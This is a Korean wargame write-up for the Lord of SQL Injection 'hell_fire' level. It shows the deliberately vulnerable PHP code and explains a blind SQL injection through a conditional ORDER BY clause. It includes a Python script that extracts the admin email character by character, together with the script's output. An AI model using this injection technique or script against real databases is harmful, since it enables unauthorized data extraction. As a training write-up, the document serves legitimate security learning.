---
title: "[Lord of SQL Injection] LoS - hell_fire 문제풀이"
date: 2018-08-23
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제에는 위에 갑자기 표가 나온다.
그리고 `pw`를 맞추는게 아니라 이번에는 `email` 주소를 알아야 한다.  

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------------
query : select id,email,score from prob_hell_fire where 1 order by
------------------------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysql_query($query);
  while(($result = mysql_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```

코드를 살펴보면 내가 입력한 값은 `order by` 뒤에 들어간다.
그리고 `id, email, score`를 추출 하는데, 이 때 `admin`의 `email` 주소는 `**************`로 처리된다.
쿼리문 위에는 표가 나타나는데, 형태는 다음과 같다.

|id|   |email|   |score|
|---|---|---|---|---|
| |   | |   | |

일단 무슨 값이 저장되어 있는지 확인하기 위해서, `?order=id`를 입력해 보았다.
그랬더니 표에 다음과 같이 데이터가 나왔다.  

|id|   |email|   |score|
|---|---|---|---|---|
|admin|   |**************|   |200|
|rubiya|   |rubiya805@gmail.cm|   |100|

그래서 문제를 어떻게 풀어야하는지 고민하다가, `order by` 뒤에 `if`문을 사용할 수 있다는 사실을 깨달았다.
내가 처음에 생각 한 방법은, `?order=if(id='admin' and length(email)>0, score, id)`를 쿼리스트링으로 넘겨주는 것이었다.
그럼 쿼리문이 아래와 같이 완성된다.  

```mysql
select id,email,score from prob_hell_fire where 1 order by if(id='admin' and length(email)>0, score, id)
```

그렇다면 만약 `id`가 `admin`이고, 그 `email`의 길이가 `0`보다 크다면 조건이 참이기 때문에 `score`를 기준으로 정렬 할 것이고, 아니라면 `id`를 기준으로 정렬 할 것이라고 생각했다.
그럼 참이라면 `rubiya` 행이, 거짓이라면 `admin`의 행이 위에 나타나게 될 것이다.
실제로 내가 데이터베이스에서 테스트 해 보면 정상적으로 실행 됬었다.
그런데 문제에서는 그게 안됬다.
`id`를 `rubiya`로 두고 테스트를 할 때는 제대로 참, 거짓에 따라 `score` 혹은 `id`를 기준으로 정렬했다.
그런데 `id='admin'`으로 두고 테스트 하면 무조건 `admin`인 행이 위에 나온다.

왜 때문인지 모르겠다.
그리고 또 한가지 이상한 점이 있는데, 쿼리스트링으로 `?order=if(id='admin' and length(email)>0, score, 9999)`를 넘겨주면 일단 참, 거짓 반응을 구분할 수 있다.
하지만 `참`일 때 `score`를 기준으로 정렬하는게 아니라, `거짓`일 때 `score`를 기준으로 정렬을 해 조건이 맞지 않으면 `rubiya`가 위에 나왔다.
얘도 왜그러는지 모르겠다...ㅎ

그런데 어쨌든 참, 거짓에 따라 결과가 구분이 되길래 아래와 같이 코드를 짜서 돌려 보았다.
만약 값이 참이라면 `admin` 행이, 거짓이라면 `rubiya` 행이 위에 나와서, `admin` 행이 위에 나온다면 그 값을 뽑아오게 했다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/hell_fire_309d5f471fbdd4722d221835380bb805.php?order="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 30):
	try:
		query = url + "if((id='admin' and length(email)=" + str(i) + "), score, 9999)"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue
	if '<td>200</td></tr><tr><td>rubiya</td>' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(33, 128):
		try:
			query = url + "if((id='admin' and ord(substr(email, " + str(j) + ", 1))=" + str(i) + "), score, 9999)"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if '<td>200</td></tr><tr><td>rubiya</td>' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

그랬더니 소스코드가 정상적으로 실행되서 문제를 풀 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  28
[+] Find password
[+] Found 1 : a
[+] Found 2 : ad
[+] Found 3 : adm
[+] Found 4 : admi
[+] Found 5 : admin
[+] Found 6 : admin_
[+] Found 7 : admin_s
[+] Found 8 : admin_se
[+] Found 9 : admin_sec
[+] Found 10 : admin_secu
[+] Found 11 : admin_secur
[+] Found 12 : admin_secure
[+] Found 13 : admin_secure_
[+] Found 14 : admin_secure_e
[+] Found 15 : admin_secure_em
[+] Found 16 : admin_secure_ema
[+] Found 17 : admin_secure_emai
[+] Found 18 : admin_secure_email
[+] Found 19 : admin_secure_email@
[+] Found 20 : admin_secure_email@e
[+] Found 21 : admin_secure_email@em
[+] Found 22 : admin_secure_email@ema
[+] Found 23 : admin_secure_email@emai
[+] Found 24 : admin_secure_email@emai1
[+] Found 25 : admin_secure_email@emai1.
[+] Found 26 : admin_secure_email@emai1.c
[+] Found 27 : admin_secure_email@emai1.co
[+] Found 28 : admin_secure_email@emai1.com
[+] Found password :  admin_secure_email@emai1.com
[+] End
```

이 이메일 주소를 아래와 같이 쿼리스트링으로 넘겨주었더니 문제를 풀 수 있었다.  

```plain
?email=admin_secure_email@emai1.com
```

근데 왜 처음에 생각한 방법이 먹히지 않는지, 왜 거짓일 때 `score`를 기준으로 정렬하는지는 아직도 모르겠다.
나중에 알게된다면 정리 해 둬야겠다.  

```php
------------------------------------------------------------------------------------------
query : select id,email,score from prob_hell_fire where 1 order by
------------------------------------------------------------------------------------------

HELL_FIRE Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysql_query($query);
  while(($result = mysql_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```

---

```plain
HELL_FIRE Clear!!
```